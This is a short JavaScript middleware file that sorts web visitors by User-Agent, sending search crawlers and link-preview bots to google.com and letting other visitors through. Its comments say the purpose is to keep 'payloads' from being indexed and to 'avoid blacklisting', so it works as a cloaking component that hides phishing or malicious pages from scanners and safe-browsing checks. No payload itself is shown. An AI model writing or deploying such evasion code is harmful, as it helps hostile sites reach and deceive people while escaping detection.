// middleware/filter.js
// Advanced bot/crawler detection to prevent automated indexing of payloads

export default function filter(req) {
    const ua = req.headers.get('user-agent') || '';
    const bots = [
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
        'yandexbot', 'facebookexternalhit', 'twitterbot', 'rogerbot', 
        'linkedinbot', 'embedly', 'quora link preview', 'showyoubot', 
        'outbrain', 'pinterest/0.', 'developers.google.com/+/web/snippet', 
        'slackbot', 'vkshare', 'redditbot', 'applebot', 'whatsapp', 'flipboard', 
        'tumblr', 'bitlybot', 'skypeuripreview', 'nuzzel', 'discordbot', 
        'google page speed', 'qwantify', 'pinterestbot', 'bitrix link preview', 
        'og-bot', 'telegrambot'
    ];

    const isBot = bots.some(bot => ua.toLowerCase().includes(bot));

    if (isBot) {
        // Redirect bots to the real site to avoid blacklisting
        return new Response(null, {
            status: 302,
            headers: { 'Location': 'https://google.com' }
        });
    }

    return null; // Proceed if human
}
